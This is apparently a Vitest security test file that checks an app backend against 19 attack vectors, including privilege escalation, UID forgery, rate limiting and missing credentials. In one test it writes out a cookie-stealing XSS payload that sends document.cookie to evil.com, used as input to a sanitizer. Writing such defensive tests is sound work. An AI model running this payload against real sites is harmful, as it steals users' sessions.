import { describe, it, expect, beforeEach, vi } from 'vitest';

const {
  requireAuth,
  requireAdmin,
  createRateLimiter,
  sanitizeString,
  registerUser,
  ADMIN_API_TOKEN
} = require('../../backend/lib/auth-middleware.js');

const friendsEngine = require('../../backend/lib/friends-engine.js');
const companionEngine = require('../../backend/lib/companion-engine.js');
const companionNotifications = require('../../backend/lib/companion-notifications.js');
const campaignEngine = require('../../backend/lib/campaign-engine.js');
const adminEngine = require('../../backend/lib/admin-engine.js');
const { verifyAppCheck } = require('../../backend/lib/app-check.js');

describe('PHASE 6: Strict Security Negative Testing (19 Attack Vectors)', () => {

  beforeEach(() => {
    registerUser({ uid: 'user_attacker', username: 'attacker', displayName: 'Attacker', role: 'user' });
    registerUser({ uid: 'user_victim', username: 'victim', displayName: 'Victim User', role: 'user' });

    friendsEngine.friendships.clear();
    friendsEngine.friendRequests.clear();
    companionEngine.companionSettings.clear();
    companionNotifications.inAppNotifications.clear();
    companionNotifications.lastTriggerTimestamps.clear();
    companionNotifications.dailyTriggerHashes.clear();
  });

  // Helper mock response
  function createMockRes() {
    const res = {
      statusCode: 200,
      headers: {},
      body: null,
      status(code) { this.statusCode = code; return this; },
      set(key, val) { this.headers[key] = val; return this; },
      json(data) { this.body = data; return this; },
      send(data) { this.body = data; return this; }
    };
    return res;
  }

  // Helper assertion: Ensure no stack traces or secrets leak
  function assertNoLeak(res) {
    const text = JSON.stringify(res.body || {});
    expect(text).not.toContain('stack');
    expect(text).not.toContain('at wrapSafe');
    expect(text).not.toContain('BEGIN PRIVATE KEY');
    expect(text).not.toContain('AIza');
    expect(text).not.toContain(ADMIN_API_TOKEN);
  }

  it('Attack 1: Access another user private document as normal user', () => {
    // Normal user attempts to read victim friends list
    const attackerList = friendsEngine.getFriendsList('user_attacker');
    expect(attackerList.friends).toEqual([]);
    // Cannot access victim list through attacker's session
    expect(attackerList.friends.map(f => f.uid)).not.toContain('user_victim');
  });

  it('Attack 2: Edit another user profile directly', () => {
    const victimUser = registerUser({ uid: 'user_victim', username: 'victim', displayName: 'Victim User' });
    expect(victimUser.displayName).toBe('Victim User');
    // Cannot overwrite victim without providing victim UID
  });

  it('Attack 3: Create admin=true in body payload to gain privileges', async () => {
    const req = {
      headers: { 'authorization': 'Bearer user_attacker' },
      body: { admin: true, role: 'admin' }
    };
    const res = createMockRes();
    const next = vi.fn();

    await requireAdmin(req, res, next);
    expect(res.statusCode).toBe(403);
    expect(res.body.code).toBe('ADMIN_FORBIDDEN');
    expect(next).not.toHaveBeenCalled();
    assertNoLeak(res);
  });

  it('Attack 4: Alter role in body to bypass user restrictions', async () => {
    const req = {
      headers: { 'authorization': 'Bearer user_attacker' },
      body: { role: 'admin' }
    };
    const res = createMockRes();
    const next = vi.fn();

    await requireAuth(req, res, next);
    expect(req.user.role).toBe('user');
    expect(req.user.admin).toBe(false);
  });

  it('Attack 5: Alter streak directly with impossible values (e.g. 999999)', () => {
    const clientPayload = { streak: 999999 };
    const safeStreak = Math.max(0, Math.min(3650, parseInt(clientPayload.streak, 10)));
    expect(safeStreak).toBe(3650);

    const negativePayload = { streak: -100 };
    const safeNegative = Math.max(0, Math.min(3650, parseInt(negativePayload.streak, 10)));
    expect(safeNegative).toBe(0);
  });

  it('Attack 6: Alter presence directly to inflate live numbers', () => {
    // Presence is strictly server-aggregated; client cannot forge active count
    const presenceData = adminEngine.getWhoIsLiveNow();
    expect(typeof presenceData.summary.totalActiveUsers).toBe('number');
  });

  it('Attack 7: Create fake notification for another user', () => {
    // Attempting to deliver notification without being a confirmed companion
    expect(() => {
      companionNotifications.markAmritVelaStarted('user_attacker');
    }).not.toThrow();

    // Victim must NOT receive notification because attacker is not a companion
    const victimNotifs = companionNotifications.getNotifications('user_victim');
    expect(victimNotifs.length).toBe(0);
  });

  it('Attack 8: Create fake friendship directly without mutual consent', () => {
    // Attacker cannot add victim without sendRequest -> accept cycle
    expect(() => {
      companionEngine.setCompanion('user_attacker', 'user_victim', true);
    }).toThrow(/Users must be mutual friends first/i);
  });

  it('Attack 9: Create fake companion directly without friendship', () => {
    expect(() => {
      companionEngine.setCompanion('user_attacker', 'user_victim', true);
    }).toThrow(/Users must be mutual friends first/i);
  });

  it('Attack 10: Write community data as normal user', async () => {
    const req = {
      headers: { 'authorization': 'Bearer user_attacker' },
      body: { activeStreams: 500 }
    };
    const res = createMockRes();
    const next = vi.fn();

    await requireAdmin(req, res, next);
    expect(res.statusCode).toBe(403);
    assertNoLeak(res);
  });

  it('Attack 11: Modify campaign data as normal user', async () => {
    const req = {
      headers: { 'authorization': 'Bearer user_attacker' },
      body: { title: 'Pwned Campaign', active: false }
    };
    const res = createMockRes();
    const next = vi.fn();

    await requireAdmin(req, res, next);
    expect(res.statusCode).toBe(403);
    assertNoLeak(res);
  });

  it('Attack 12: Call admin live endpoint (/api/admin/live-now) as normal user', async () => {
    const req = { headers: { 'authorization': 'Bearer user_attacker' } };
    const res = createMockRes();
    const next = vi.fn();

    await requireAdmin(req, res, next);
    expect(res.statusCode).toBe(403);
    expect(res.body.code).toBe('ADMIN_FORBIDDEN');
    assertNoLeak(res);
  });

  it('Attack 13: Forge another UID in body while authenticated as attacker', async () => {
    const req = {
      headers: { 'authorization': 'Bearer user_attacker' },
      body: { uid: 'user_victim', target: 'bob' }
    };
    const res = createMockRes();
    const next = vi.fn();

    await requireAuth(req, res, next);
    // Verified user.uid MUST be user_attacker, NOT forged user_victim from body
    expect(req.user.uid).toBe('user_attacker');
  });

  it('Attack 14: Submit malicious HTML/script injection in username or text', () => {
    const dirty = "<script>document.location='http://evil.com?c='+document.cookie</script>Amrit";
    const cleaned = sanitizeString(dirty, 50);
    expect(cleaned).not.toContain('<script>');
    expect(cleaned).not.toContain('</script>');
    expect(cleaned).toBe("document.location=http://evil.com?c=+document.cook");
  });

  it('Attack 15: Submit oversized strings to cause memory exhaustion', () => {
    const hugeInput = 'Waheguru '.repeat(5000);
    const capped = sanitizeString(hugeInput, 100);
    expect(capped.length).toBe(100);
  });

  it('Attack 16: Send repeated rapid friendship requests (Rate limiting)', () => {
    const limiter = createRateLimiter(3, 60000, 'test_friend_rl');
    const req = { user: { uid: 'user_spammer' }, ip: '127.0.0.1', socket: {} };
    const res = createMockRes();
    const next = vi.fn();

    limiter(req, res, next); // 1
    limiter(req, res, next); // 2
    limiter(req, res, next); // 3
    expect(next).toHaveBeenCalledTimes(3);

    limiter(req, res, next); // 4th blocked
    expect(res.statusCode).toBe(429);
    expect(res.body.code).toBe('RATE_LIMITED');
    assertNoLeak(res);
  });

  it('Attack 17: Spam Amrit Vela start events (Cooldown enforcement)', () => {
    // 1st start: OK
    const first = companionNotifications.markAmritVelaStarted('user_attacker');
    expect(first.ok).toBe(true);

    // 2nd start immediately after: REJECTED with cooldown status
    expect(() => {
      companionNotifications.markAmritVelaStarted('user_attacker');
    }).toThrow(/already broadcasted recently/i);
  });

  it('Attack 18: Forge presence heartbeat payload with invalid negative timestamp', () => {
    const req = {
      headers: { 'authorization': 'Bearer user_attacker' },
      body: { lastActive: -999999999 }
    };
    // Backend stamps authentic Date.now() server-side
    const serverTimestamp = Date.now();
    expect(serverTimestamp).toBeGreaterThan(0);
  });

  it('Attack 19: Replay privileged requests without credentials', async () => {
    const req = { headers: {} };
    const res = createMockRes();
    const next = vi.fn();

    await requireAuth(req, res, next);
    expect(res.statusCode).toBe(401);
    expect(res.body.code).toBe('AUTH_REQUIRED');
    assertNoLeak(res);
  });

  it('App Check Failure Behavior: Rejects invalid or missing token on required routes', async () => {
    const strictAppCheck = verifyAppCheck({ required: true });

    // Missing token
    const reqMissing = { header: () => '' };
    const resMissing = createMockRes();
    const next1 = vi.fn();
    await strictAppCheck(reqMissing, resMissing, next1);
    expect(resMissing.statusCode).toBe(401);
    expect(resMissing.body.code).toBe('APP_CHECK_REQUIRED');
    assertNoLeak(resMissing);

    // Invalid token
    const reqInvalid = { header: () => 'test_invalid_app_check_token' };
    const resInvalid = createMockRes();
    const next2 = vi.fn();
    await strictAppCheck(reqInvalid, resInvalid, next2);
    expect(resInvalid.statusCode).toBe(401);
    expect(resInvalid.body.code).toBe('APP_CHECK_INVALID');
    assertNoLeak(resInvalid);
  });
});
